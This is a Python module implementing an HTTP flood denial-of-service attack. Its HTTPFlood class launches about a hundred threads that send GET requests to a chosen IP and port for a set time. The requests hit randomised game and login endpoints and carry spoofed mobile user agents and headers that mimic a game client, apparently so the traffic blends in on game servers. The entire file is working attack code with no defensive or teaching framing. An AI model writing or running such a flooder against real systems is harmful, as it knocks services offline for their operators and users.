import requests
import threading
import time
import random
from .utils import Statistics

class HTTPFlood:
    def __init__(self):
        self.stop_flag = False
        self.stats = Statistics()
    
    def start_attack(self, ip, port, threads=100, duration=30):
        self.stop_flag = False
        self.stats = Statistics()
        self.stats.start()
        
        base_url = f"http://{ip}:{port}"
        
        def flood():
            session = requests.Session()
            while not self.stop_flag:
                try:
                    # Random endpoints
                    endpoints = [
                        "/", "/login", "/api/v1/login", "/match", "/room",
                        "/api/game/connect", "/ws", "/api/heartbeat", 
                        "/api/player/status", "/api/match/join",
                        f"/api/room?id={random.randint(1,99999)}",
                        f"/game?token={random.randint(100000,999999)}",
                        f"/connect?user={random.randint(1000,9999)}"
                    ]
                    
                    url = base_url + random.choice(endpoints)
                    
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Linux; Android 13)',
                            'Mozilla/5.0 (iPhone; CPU iPhone OS 17)',
                            'Mozilla/5.0 (Windows NT 10.0)'
                        ]),
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'X-Requested-With': 'com.tencent.ig',
                        'X-Unity-Version': '2021.3.0f1'
                    }
                    
                    response = session.get(url, headers=headers, timeout=2)
                    self.stats.add_connection()
                    self.stats.add_packet(len(response.content))
                    
                except:
                    self.stats.add_error()
                    
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        self.stop_flag = True
        
        for t in thread_list:
            t.join(timeout=2)
        
        return self.stats.get_report()
    
    def stop_attack(self):
        self.stop_flag = True
        return True
